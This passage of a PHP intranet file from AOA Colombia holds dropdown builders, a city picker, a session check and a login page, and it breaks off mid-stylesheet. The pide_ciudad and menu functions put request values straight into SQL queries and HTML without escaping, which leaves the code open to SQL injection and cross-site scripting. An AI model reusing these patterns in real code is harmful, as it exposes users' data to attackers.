	if($Items = mysql_query($Query,$LINK_CD))
	{
		while($I = mysql_fetch_row($Items))
		{
			$Resultado .= "\n<option value='" . $I[0] . "' ";
			if($I[0] == $DATO) $Resultado .= " selected ";
			$Resultado .= ">" . $I[1] . "</option>";
		}
	}
	$Resultado .= "</select>\n";
	return $Resultado;
}

function pide_ciudad() // popup que pide la ciudad por orden alfabetico en dos etapas primero departamento y luego ciudad.
{
	global $Campo, $Dato, $Forma, $Dep_sel;
	# # FUNCION PARA PEDIR LA CIUDAD Y GRABAR LA INFORMACION EN UN CAMPO
	$Codigo = 'codigo';
	$Ciudad = 'ciudad'; ## Nombre de la tabla de la ciudad
	$Departamento = 'departamento'; ##Campo que guarda el departamento de la ciudad
	$Nombre = 'nombre'; ## Campo que tiene el nombre de la ciudad

	if(!$Campo) $Campo = 'ciudad';
	if(!$Dato) $Dato = 0;
	else
	{
		$Dep_sel = qo1("Select $Departamento from $Ciudad where $Codigo='$Dato'");
	}
	if(!$Forma) $Forma = 'mod';

	html();
	echo "<body onload='centrar(500,300);'>" . titulo_modulo("CIUDAD");
	echo "<FORM action='marcoindex.php' name='PC' id='PC' target='_self' method='post'>
		<INPUT type='hidden' name='Campo' value='$Campo'>
		<INPUT type='hidden' name='Forma' value='$Forma'>
		<INPUT type='hidden' name='Acc' value='pide_ciudad'>
		Departamento: " . menu1("Dep_sel", "Select distinct $Departamento,$Departamento from $Ciudad order by $Departamento", $Dep_sel,
		1, 'font-family:arial;font-size:11px;', "onchange=\"this.form.submit();\"");
	echo "</form>";
	if($Dep_sel)
	{
		echo "<FORM name='Fciudad' id='Fciudad'>
		 	Ciudad: " . menu1("Ciud_sel", "Select $Codigo,$Nombre from $Ciudad where $Departamento = '$Dep_sel' order by $Nombre", $Dato,
			 1, 'font-family:arial;font-size:11px;',
			"onchange=\"opener.document.$Forma.$Campo.value=this.value;if(opener.document.$Forma._$Campo) {opener.document.$Forma._$Campo.value='$Dep_sel'+' - '+document.Fciudad.Ciud_sel.options[document.Fciudad.Ciud_sel.selectedIndex].text;} window.close();void(null);\"");
		echo "</FORM>";
	}
	else echo"</body>";
}

function pide_periodo($Dato,$Campo='PERIODO',$JAVA="") // Pide periodo
{
	return "Seleccione el periodo: ".menu1($Campo,"select periodo,periodo from periodo order by periodo desc",$Dato,1,'font-size:14px;',$JAVA);
}

function pide_grupo($Forma = 'forma', $Campo = 'GRUPO', $Dato = '', $Adicional = '') // pide grupo depende de la existencia de zseleccion_grupo.php
{
	return "Seleccione el grupo: <input  type='text' size=4 name='$Campo'
	onclick=\"modal('zseleccion_grupo.php?Campo=$Campo',50,50,500,500,'se');\">";
}

function menu1($Campo, $Query, $DATO = 0, $Blanco = 0, $Estilo = '', $Javascript = '', $LINK=0) // muestra una captura tipo menu colgante
{
	$Resultado = "\n<select name='$Campo' id='$Campo' style='$Estilo' $Javascript>";
    
	
	$Items=$LINK?mysql_query($Query,$LINK):q($Query);
	if($Items)
	{
		if($Blanco) $Resultado .= "<option value=''>Seleccione una opción</option>";
		while($I = mysql_fetch_row($Items))
		{
			$Resultado .= "\n<option value='" . $I[0] . "' ";
			if($I[0] == $DATO) $Resultado .= " selected ";
			$Resultado .= ">" . $I[1] . "</option>";
		}
	}
	else
	{
		$Resultado .= "<option disabled SELECTED value=''>No hay información</option>";
	}
	$Resultado .= "</select>\n";
	return $Resultado;
}

function menu4($Campo, $Query, $DATO = 0, $Blanco = 0, $Estilo = '', $Javascript = '', $LINK=0) // muestra una captura tipo menu colgante
{
	$Resultado = "\n<select name='$Campo' id='$Campo' style='$Estilo' $Javascript>";
    //$Items=$LINK?mysql_query($Query,$LINK):q($Query); Anterio utilizado por desarrollador, ahora quedara con la funcion q modificacion por Sergio Urbina
	$Items = q($Query);
	if($Items)
	{
		if($Blanco) $Resultado .= "<option value=''>Seleccione una opción</option>";
		while($I = mysql_fetch_row($Items))
		{
			$Resultado .= "\n<option value='" . $I[0] . "' ";
			if($I[0] == $DATO) $Resultado .= " selected ";
			$Resultado .= ">" . $I[1] . "</option>";
		}
	}
	else
	{
		$Resultado .= "<option disabled SELECTED value=''>No hay información</option>";
	}
	$Resultado .= "</select>\n";
	return $Resultado;
}



# ###   YA REVISADO.. LO QUE CAMBIA ES EL INDICE QUE SE MUESTRA EN EL VALUE DE CADA OPTION
# ##    ESTE MENU2 ES USADO EN EDICION DE CAMPO ESTANDAR desde EDIT_CAMPO.PHP
function menu2($Campo, $Query, $DATO = 0, $Blanco = 0, $Estilo = '',$Javascript='', $LINK=0)  //  muestra un menu tipo Select donde el primer parametro es el Texto y el segundo el Value
{
	
	$Resultado = "\n<select name='$Campo' style='$Estilo' $Javascript>";
	if($Blanco) $Resultado .= "<option>Seleccione una opción</option>";
	$Items=($LINK?mysql_query($Query,$LINK):q($Query));
	if($Items)
	{
		while($I = mysql_fetch_row($Items))
		{
			$Resultado .= "\n<option value='" . $I[1] . "' ";
			if($I[1] == $DATO) $Resultado .= " selected ";
			$Resultado .= ">" . $I[0] . "</option>";
		}
	}
	else
	{
		$Resultado .= "<option disabled SELECTED value=''>No hay información</option>";
	}
	$Resultado .= "</select>\n";
	return $Resultado;
}

##}  Usado en Edicion de Campo Estandar en Edit_campo.php
function menu3($Campo, $Cadena, $DATO = 0, $Blanco = 0, $Estilo = '',$Javascript='')  // muestra un menu tipo Select donde una cadena se divide en ; cada opcion es value,texto
{
	if(!$Javascript) $Javascript=" onchange='this.form.submit();' ";
	$Resultado = "\n<select name='$Campo' style='$Estilo' $Javascript>";
	if($Blanco) $Resultado .= "<option></option>";
	$OPCIONES = explode(";", $Cadena);
	foreach($OPCIONES AS $Opcion)
	{
		$VALORES = explode(",", $Opcion);
		$Resultado .= "\n<option value='" . $VALORES[0] . "' ";
		if($VALORES[0] == $DATO) $Resultado .= " selected ";
		$Resultado .= ">" . $VALORES[1] . "</option>";
	}
	$Resultado .= "</select>\n";
	return $Resultado;
}


#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES DE SESION***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function sesion() // verificacion de la sesion
{
	//session_cache_expire('9000000');
	session_start();
	session_cache_limiter('private');
	if(inlist($_SESSION['User'],'12,30,33')) die('APLICACION EN MANTENIMIENTO. Atte. Departamento de Tecnologia de Informacion');
	//if($_SESSION['User']>1) die('APLICACION SUSPENDIDA POR 5 MINUTOS. Atte. Departamento de Tecnologia de Informacion');
	if ($_SESSION['User'] && $_SESSION['Id_alterno'] && $_SESSION['Nick'] && $_SESSION['Nombre'])
	{
		if(isset($_SESSION['Pide_cambio_pass']))
		if($_SESSION['Pide_cambio_pass']==1)
		{
			echo "<script language='javascript'>alert('El ultimo cambio de contraseña registrado supera 6 meses de tiempo. A continuación se le solicitará una nueva contraseña.');
					window.open('marcoindex.php?Acc=cambio_pass','_self');</script>";
			die();
		}
		return true;
	}
	else
	{			
		session_unset();session_destroy();
        echo "<script language='javascript' src='inc/js/aqrl.js'></script>		
        <body onload='re_sesion();'></body></html>";
        die();

	}
}

function ingreso_sistema() // funcion que presenta la ventana de ingreso de usuario y clave
{
	session_start();
	session_unset();session_destroy();
	global $siguientePHP,$registroPHP,$Creacookiesingreso,$Noimg,$error_previo;
	
	echo "<!DOCTYPE>
	<html>
<head>
  <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>
		<!--// SITE META //-->
		<meta charset='UTF-8' />	
		<meta name='viewport' content='width=device-width, initial-scale=1.0' />
				
		<!--// PINGBACK //-->
		<link rel='pingback' href='https://www.aoacolombia.com/xmlrpc.php' />

		<!--// WORDPRESS HEAD HOOK //-->
		<title>Intranet AOA Colombia &#8211; AOA Colombia</title>
		<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>

	<script src='https://www.google.com/recaptcha/api.js'></script>
	<script src='https://www.google.com/recaptcha/api.js?hl=es'></script> 
	

	
	<script type='text/javascript'>
	
	

	function mostrarPassword(){
		
				var cambio = document.getElementById('txtPassword');
				if(cambio.type == 'password'){
					cambio.type = 'text';
					document.getElementById('imageid').src='img/eye.png';
					$('.icon').removeClass('fa fa-eye-slash').addClass('fa fa-eye');
				}else{
					cambio.type = 'password';
					document.getElementById('imageid').src='img/hide.png';
					$('.icon').removeClass('fa fa-eye').addClass('fa fa-eye-slash');
				}
			} 
var onloadCallback = function() {
	
		$('.check-contra').click(function () {
        console.log('hola mundo');
        if ($(this).is(':checked')) {
          $('.contra-input').attr('type', 'text');
          $(this).siblings('label.box-icon').find('.far').removeClass('fa-eye').addClass('fa-eye-slash font-orange');
        } else {
          $('.contra-input').attr('type', 'password');
          $(this).siblings('label.box-icon').find('.far').removeClass('fa-eye-slash font-orange').addClass('fa-eye');
        }
	  });
	
}
</script>
    <script>
        writeCookie();
        function writeCookie()
        {
            the_cookie = document.cookie;
            if( the_cookie ){
                if( window.devicePixelRatio >= 2 ){
                    the_cookie = 'pixel_ratio='+window.devicePixelRatio+';'+the_cookie;
                    document.cookie = the_cookie;
                }
            }
        }
    </script>
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='alternate' type='application/rss+xml' title='AOA Colombia &raquo; Feed' href='https://www.aoacolombia.com/index.php/feed/' />
<link rel='alternate' type='application/rss+xml' title='AOA Colombia &raquo; Comments Feed' href='https://www.aoacolombia.com/index.php/comments/feed/' />
		<script type='text/javascript'>
			window._wpemojiSettings = {'baseUrl':'https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/','ext':'.png','svgUrl':'https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/','svgExt':'.svg','source':{'concatemoji':'https:\/\/www.aoacolombia.com\/webAOA\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.5'}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline='top',l.font='600 32px Arial',a){case'flag':return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case'emoji':return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement('script');c.src=a,c.defer=c.type='text/javascript',b.getElementsByTagName('head')[0].appendChild(c)}var g,h,i,j,k=b.createElement('canvas'),l=k.getContext&&k.getContext('2d');for(j=Array('flag','emoji'),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],'flag'!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener('DOMContentLoaded',h,!1),a.addEventListener('load',h,!1)):(a.attachEvent('onload',h),b.attachEvent('onreadystatechange',function(){'complete'===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type='text/css'>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important; 
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-block-library-css'  href='css/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='css/css.css' type='text/css' media='all' />

	<link rel='stylesheet' id='layerslider-css'  href='https://www.aoacolombia.com/wp-content/plugins/LayerSlider/static/layerslider/css/layerslider.css?ver=6.9.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://www.aoacolombia.com/wp-includes/css/dist/block-library/style.min.css?ver=5.2.5' type='text/css' media='all' />
<link rel='stylesheet' id='contact-form-7-css'  href='https://www.aoacolombia.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.1.4' type='text/css' media='all' />
<link rel='stylesheet' id='wpsm_ac-font-awesome-front-css'  href='https://www.aoacolombia.com/wp-content/plugins/responsive-accordion-and-collapse/css/font-awesome/css/font-awesome.min.css?ver=5.2.5' type='text/css' media='all' />
<link rel='stylesheet' id='wpsm_ac_bootstrap-front-css'  href='https://www.aoacolombia.com/wp-content/plugins/responsive-accordion-and-collapse/css/bootstrap-front.css?ver=5.2.5' type='text/css' media='all' />
<link rel='stylesheet' id='rs-plugin-settings-css'  href='https://www.aoacolombia.com/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.0.9' type='text/css' media='all' />
<style id='rs-plugin-settings-inline-css' type='text/css'>
#rs-demo-id {}
</style>
<link rel='stylesheet' id='wpsm_tabs_r-font-awesome-front-css'  href='https://www.aoacolombia.com/wp-content/plugins/tabs-responsive/assets/css/font-awesome/css/font-awesome.min.css?ver=5.2.5' type='text/css' media='all' />
<link rel='stylesheet' id='wpsm_tabs_r_bootstrap-front-css'  href='https://www.aoacolombia.com/wp-content/plugins/tabs-responsive/assets/css/bootstrap-front.css?ver=5.2.5' type='text/css' media='all' />
<link rel='stylesheet' id='wpsm_tabs_r_animate-css'  href='https://www.aoacolombia.com/wp-content/plugins/tabs-responsive/assets/css/animate.css?ver=5.2.5' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css'  href='https://www.aoacolombia.com/wp-content/themes/dante/css/bootstrap.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-v5-css'  href='https://www.aoacolombia.com/wp-content/themes/dante/css/font-awesome.min.css?ver=5.10.1' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-v4shims-css'  href='https://www.aoacolombia.com/wp-content/themes/dante/css/v4-shims.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='ssgizmo-css'  href='https://www.aoacolombia.com/wp-content/themes/dante/css/ss-gizmo.css' type='text/css' media='all' />
<link rel='stylesheet' id='sf-main-css'  href='https://www.aoacolombia.com/wp-content/themes/dante/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='sf-responsive-css'  href='https://www.aoacolombia.com/wp-content/themes/dante/css/responsive.css' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var LS_Meta = {'v':'6.9.0'};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/LayerSlider/static/layerslider/js/greensock.js?ver=1.19.0'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/LayerSlider/static/layerslider/js/layerslider.kreaturamedia.jquery.js?ver=6.9.0'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/LayerSlider/static/layerslider/js/layerslider.transitions.js?ver=6.9.0'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/revslider/public/assets/js/revolution.tools.min.js?ver=6.0'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.0.9'></script>
<meta name='generator' content='Powered by LayerSlider 6.9.0 - Multi-Purpose, Responsive, Parallax, Mobile-Friendly Slider Plugin for WordPress.' />
<!-- LayerSlider updates and docs at: https://layerslider.kreaturamedia.com -->
<link rel='https://api.w.org/' href='https://www.aoacolombia.com/index.php/wp-json/' />
<meta name='generator' content='WordPress 5.2.5' />
<link rel='canonical' href='https://www.aoacolombia.com/index.php/intranet-aoa-colombia/' />
<link rel='shortlink' href='https://www.aoacolombia.com/?p=79' />
<link rel='alternate' type='application/json+oembed' href='https://www.aoacolombia.com/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.aoacolombia.com%2FwebAOA%2Findex.php%2Fintranet-aoa-colombia%2F' />
<link rel='alternate' type='text/xml+oembed' href='https://www.aoacolombia.com/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.aoacolombia.com%2FwebAOA%2Findex.php%2Fintranet-aoa-colombia%2F&#038;format=xml' />

		<script>
		(function(h,o,t,j,a,r){
			h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
			h._hjSettings={hjid:1530846,hjsv:5};
			a=o.getElementsByTagName('head')[0];
			r=o.createElement('script');r.async=1;
			r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
			a.appendChild(r);
		})(window,document,'//static.hotjar.com/c/hotjar-','.js?sv=');
		</script>
					<script type='text/javascript'>
			var ajaxurl = 'https://www.aoacolombia.com/wp-admin/admin-ajax.php';
			</script>
		<style type='text/css'>
body, p, #commentform label, .contact-form label {font-size: 14px;line-height: 22px;}h1 {font-size: 24px;line-height: 34px;}h2 {font-size: 20px;line-height: 30px;}h3, .blog-item .quote-excerpt {font-size: 18px;line-height: 24px;}h4, .body-content.quote, #respond-wrap h3, #respond h3 {font-size: 16px;line-height: 20px;}h5 {font-size: 14px;line-height: 18px;}h6 {font-size: 12px;line-height: 16px;}nav .menu li {font-size: 14px;}::selection, ::-moz-selection {background-color: #a8ad00; color: #fff;}.recent-post figure, span.highlighted, span.dropcap4, .loved-item:hover .loved-count, .flickr-widget li, .portfolio-grid li, input[type='submit'], .wpcf7 input.wpcf7-submit[type='submit'], .gform_wrapper input[type='submit'], .mymail-form input[type='submit'], .woocommerce-page nav.woocommerce-pagination ul li span.current, .woocommerce nav.woocommerce-pagination ul li span.current, figcaption .product-added, .woocommerce .wc-new-badge, .yith-wcwl-wishlistexistsbrowse a, .yith-wcwl-wishlistaddedbrowse a, .woocommerce .widget_layered_nav ul li.chosen > *, .woocommerce .widget_layered_nav_filters ul li a, .sticky-post-icon, .fw-video-close:hover {background-color: #a8ad00!important; color: #ffffff;}a:hover, a:focus, #sidebar a:hover, .pagination-wrap a:hover, .carousel-nav a:hover, .portfolio-pagination div:hover > i, #footer a:hover, #copyright a, .beam-me-up a:hover span, .portfolio-item .portfolio-item-permalink, .read-more-link, .blog-item .read-more, .blog-item-details a:hover, .author-link, #reply-title small a, #respond .form-submit input:hover, span.dropcap2, .spb_divider.go_to_top a, love-it-wrapper:hover .love-it, .love-it-wrapper:hover span.love-count, .love-it-wrapper .loved, .comments-likes .loved span.love-count, .comments-likes a:hover i, .comments-likes .love-it-wrapper:hover a i, .comments-likes a:hover span, .love-it-wrapper:hover a i, .item-link:hover, #header-translation p a, #swift-slider .flex-caption-large h1 a:hover, .wooslider .slide-title a:hover, .caption-details-inner .details span > a, .caption-details-inner .chart span, .caption-details-inner .chart i, #swift-slider .flex-caption-large .chart i, #breadcrumbs a:hover, .ui-widget-content a:hover, .yith-wcwl-add-button a:hover, #product-img-slider li a.zoom:hover, .woocommerce .star-rating span, .article-body-wrap .share-links a:hover, ul.member-contact li a:hover, .price ins, .bag-product a.remove:hover, .bag-product-title a:hover, #back-to-top:hover,  ul.member-contact li a:hover, .fw-video-link-image:hover i, .ajax-search-results .all-results:hover, .search-result h5 a:hover .ui-state-default a:hover {color: #a8ad00;}.carousel-wrap > a:hover, #mobile-menu ul li:hover > a {color: #a8ad00!important;}.comments-likes a:hover span, .comments-likes a:hover i {color: #a8ad00!important;}.read-more i:before, .read-more em:before {color: #a8ad00;}input[type='text']:focus, input[type='email']:focus, input[type='tel']:focus, textarea:focus, .bypostauthor .comment-wrap .comment-avatar,.search-form input:focus, .wpcf7 input:focus, .wpcf7 textarea:focus, .ginput_container input:focus, .ginput_container textarea:focus, .mymail-form input:focus, .mymail-form textarea:focus {border-color: #a8ad00!important;}nav .menu ul li:first-child:after,.navigation a:hover > .nav-text, .returning-customer a:hover {border-bottom-color: #a8ad00;}nav .menu ul ul li:first-child:after {border-right-color: #a8ad00;}.spb_impact_text .spb_call_text {border-left-color: #a8ad00;}.spb_impact_text .spb_button span {color: #fff;}#respond .form-submit input#submit {border-color: #a8ad00;background-color: #FFFFFF;}#respond .form-submit input#submit:hover {border-color: #a8ad00;background-color: #a8ad00;color: #ffffff;}.woocommerce .free-badge, .my-account-login-wrap .login-wrap form.login p.form-row input[type='submit'], .woocommerce .my-account-login-wrap form input[type='submit'] {background-color: #2b2b2b; color: #ffffff;}a[rel='tooltip'], ul.member-contact li a, .blog-item-details a, .post-info a, a.text-link, .tags-wrap .tags a, .logged-in-as a, .comment-meta-actions .edit-link, .comment-meta-actions .comment-reply, .read-more {border-color: #a8ad00;}.super-search-go {border-color: #a8ad00!important;}.super-search-go:hover {background: #a8ad00!important;border-color: #a8ad00!important;}body {color: #003057;}.pagination-wrap a, .search-pagination a {color: #003057;}.layout-boxed #header-search, .layout-boxed #super-search, body > .sf-super-search {background-color: #2b2b2b;}body {background-color: #2b2b2b;}#main-container, .tm-toggle-button-wrap a {background-color: #FFFFFF;}a, .ui-widget-content a {color: #767676;}.pagination-wrap li a:hover, ul.bar-styling li:not(.selected) > a:hover, ul.bar-styling li > .comments-likes:hover, ul.page-numbers li > a:hover, ul.page-numbers li > span.current {color: #ffffff!important;background: #a8ad00;border-color: #a8ad00;}ul.bar-styling li > .comments-likes:hover * {color: #ffffff!important;}.pagination-wrap li a, .pagination-wrap li span, .pagination-wrap li span.expand, ul.bar-styling li > a, ul.bar-styling li > div, ul.page-numbers li > a, ul.page-numbers li > span, .curved-bar-styling, ul.bar-styling li > form input {border-color: #a8ad00;}ul.bar-styling li > a, ul.bar-styling li > span, ul.bar-styling li > div, ul.bar-styling li > form input {background-color: #FFFFFF;}input[type='text'], input[type='password'], input[type='email'], input[type='tel'], textarea, select {border-color: #a8ad00;background: #f7f7f7;}textarea:focus, input:focus {border-color: #999!important;}.modal-header {background: #f7f7f7;}.recent-post .post-details, .team-member .team-member-position, .portfolio-item h5.portfolio-subtitle, .mini-items .blog-item-details, .standard-post-content .blog-item-details, .masonry-items .blog-item .blog-item-details, .jobs > li .job-date, .search-item-content time, .search-item-content span, .blog-item-details a, .portfolio-details-wrap .date,  .portfolio-details-wrap .tags-link-wrap {color: #222222;}ul.bar-styling li.facebook > a:hover {color: #fff!important;background: #3b5998;border-color: #3b5998;}ul.bar-styling li.twitter > a:hover {color: #fff!important;background: #4099FF;border-color: #4099FF;}ul.bar-styling li.google-plus > a:hover {color: #fff!important;background: #d34836;border-color: #d34836;}ul.bar-styling li.pinterest > a:hover {color: #fff!important;background: #cb2027;border-color: #cb2027;}#header-search input, #header-search a, .super-search-close, #header-search i.ss-search {color: #fff;}#header-search a:hover, .super-search-close:hover {color: #a8ad00;}.sf-super-search, .spb_supersearch_widget.asset-bg {background-color: #2b2b2b;}.sf-super-search .search-options .ss-dropdown > span, .sf-super-search .search-options input {color: #a8ad00; border-bottom-color: #a8ad00;}.sf-super-search .search-options .ss-dropdown ul li .fa-check {color: #a8ad00;}.sf-super-search-go:hover, .sf-super-search-close:hover { background-color: #a8ad00; border-color: #a8ad00; color: #ffffff;}#top-bar {background: #a8ad00; color: #ffffff;}#top-bar .tb-welcome {border-color: #f7f7f7;}#top-bar a {color: #ffffff;}#top-bar .menu li {border-left-color: #f7f7f7; border-right-color: #f7f7f7;}#top-bar .menu > li > a, #top-bar .menu > li.parent:after {color: #ffffff;}#top-bar .menu > li > a:hover, #top-bar a:hover {color: #2b2b2b;}#top-bar .show-menu {background-color: #f7f7f7;color: #2b2b2b;}#header-languages .current-language {background: #76881d; color: #a8ad00;}#header-section:before, #header .is-sticky .sticky-header, #header-section .is-sticky #main-nav.sticky-header, #header-section.header-6 .is-sticky #header.sticky-header, .ajax-search-wrap {background-color: #ffffff;background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#ffffff), to(#ffffff));background: -webkit-linear-gradient(top, #ffffff, #ffffff);background: -moz-linear-gradient(top, #ffffff, #ffffff);background: -ms-linear-gradient(top, #ffffff, #ffffff);background: -o-linear-gradient(top, #ffffff, #ffffff);}#logo img {padding-top: 10px;padding-bottom: 0px;}#logo img, #logo img.retina {width: 250px;}#logo {max-height: 42px;}#header-section .header-menu .menu li, #mini-header .header-right nav .menu li {border-left-color: #a8ad00;}#header-section #main-nav {border-top-color: #a8ad00;}#top-header {border-bottom-color: #e4e4e4;}#top-header {border-bottom-color: #e4e4e4;}#top-header .th-right > nav .menu li, .ajax-search-wrap:after {border-bottom-color: #e4e4e4;}.ajax-search-wrap, .ajax-search-results, .search-result-pt .search-result {border-color: #a8ad00;}.page-content {border-bottom-color: #a8ad00;}.ajax-search-wrap input[type='text'], .search-result-pt h6, .no-search-results h6, .search-result h5 a {color: #8c8c8c;}@media only screen and (max-width: 991px) {
			.naked-header #header-section, .naked-header #header-section:before, .naked-header #header .is-sticky .sticky-header, .naked-header .is-sticky #header.sticky-header {background-color: #ffffff;background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#ffffff), to(#ffffff));background: -webkit-linear-gradient(top, #ffffff, #ffffff);background: -moz-linear-gradient(top, #ffffff, #ffffff);background: -ms-linear-gradient(top, #ffffff, #ffffff);background: -o-linear-gradient(top, #ffffff, #ffffff);}
			}nav#main-navigation .menu > li > a span.nav-line {background-color: #76881d;}.show-menu {background-color: #2b2b2b;color: #ffffff;}nav .menu > li:before {background: #76881d;}nav .menu .sub-menu .parent > a:after {border-left-color: #76881d;}nav .menu ul.sub-menu {background-color: #a8ad00;}nav .menu ul.sub-menu li {border-bottom-color: #a8ad00;border-bottom-style: solid;}nav.mega-menu li .mega .sub .sub-menu, nav.mega-menu li .mega .sub .sub-menu li, nav.mega-menu li .sub-container.non-mega li, nav.mega-menu li .sub li.mega-hdr {border-top-color: #a8ad00;border-top-style: solid;}nav.mega-menu li .sub li.mega-hdr {border-right-color: #a8ad00;border-right-style: solid;}nav .menu > li.menu-item > a, nav .menu > li.menu-item.indicator-disabled > a, #menubar-controls a, nav.search-nav .menu>li>a, .naked-header .is-sticky nav .menu > li a {color: #8c8c8c;}nav .menu > li.menu-item:hover > a {color: #76881d;}nav .menu ul.sub-menu li.menu-item > a, nav .menu ul.sub-menu li > span, #top-bar nav .menu ul li > a {color: #ffffff;}nav .menu ul.sub-menu li.menu-item:hover > a {color: #ffffff!important; background: #76881d;}nav .menu li.parent > a:after, nav .menu li.parent > a:after:hover {color: #aaa;}nav .menu li.current-menu-ancestor > a, nav .menu li.current-menu-item > a, #mobile-menu .menu ul li.current-menu-item > a, nav .menu li.current-scroll-item > a {color: #76881d;}nav .menu ul li.current-menu-ancestor > a, nav .menu ul li.current-menu-item > a {color: #a8ad00; background: #76881d;}#main-nav .header-right ul.menu > li, .wishlist-item {border-left-color: #a8ad00;}#nav-search, #mini-search {background: #a8ad00;}#nav-search a, #mini-search a {color: #ffffff;}.bag-header, .bag-product, .bag-empty, .wishlist-empty {border-color: #a8ad00;}.bag-buttons a.sf-button.bag-button, .bag-buttons a.sf-button.wishlist-button, .bag-buttons a.sf-button.guest-button {background-color: #a8ad00; color: #003057!important;}.bag-buttons a.checkout-button, .bag-buttons a.create-account-button, .woocommerce input.button.alt, .woocommerce .alt-button, .woocommerce button.button.alt, .woocommerce #account_details .login form p.form-row input[type='submit'], #login-form .modal-body form.login p.form-row input[type='submit'] {background: #2b2b2b; color: #ffffff;}.woocommerce .button.update-cart-button:hover, .woocommerce #account_details .login form p.form-row input[type='submit']:hover, #login-form .modal-body form.login p.form-row input[type='submit']:hover {background: #a8ad00; color: #ffffff;}.woocommerce input.button.alt:hover, .woocommerce .alt-button:hover, .woocommerce button.button.alt:hover {background: #a8ad00; color: #ffffff;}.shopping-bag:before, nav .menu ul.sub-menu li:first-child:before {border-bottom-color: #76881d;}nav ul.menu > li.menu-item.sf-menu-item-btn > a {background-color: #76881d;color: #8c8c8c;}nav ul.menu > li.menu-item.sf-menu-item-btn:hover > a {color: #76881d;background-color: #8c8c8c;}#base-promo {background-color: #e4e4e4;}#base-promo > p, #base-promo.footer-promo-text > a, #base-promo.footer-promo-arrow > a {color: #2b2b2b;}#base-promo.footer-promo-arrow:hover, #base-promo.footer-promo-text:hover {background-color: #a8ad00;color: #ffffff;}#base-promo.footer-promo-arrow:hover > *, #base-promo.footer-promo-text:hover > * {color: #ffffff;}.page-heading {background-color: #f7f7f7;border-bottom-color: #a8ad00;}.page-heading h1, .page-heading h3 {color: #003057;}#breadcrumbs {color: #2b2b2b;}#breadcrumbs a, #breadcrumb i {color: #767676;}body, input[type='text'], input[type='password'], input[type='email'], textarea, select, .ui-state-default a {color: #003057;}h1, h1 a {color: #003057;}h2, h2 a {color: #003057;}h3, h3 a {color: #003057;}h4, h4 a, .carousel-wrap > a {color: #003057;}h5, h5 a {color: #003057;}h6, h6 a {color: #003057;}.spb_impact_text .spb_call_text, .impact-text, .impact-text-large {color: #2b2b2b;}.read-more i, .read-more em {color: transparent;}.pb-border-bottom, .pb-border-top, .read-more-button {border-color: #a8ad00;}#swift-slider ul.slides {background: #2b2b2b;}#swift-slider .flex-caption .flex-caption-headline {background: #FFFFFF;}#swift-slider .flex-caption .flex-caption-details .caption-details-inner {background: 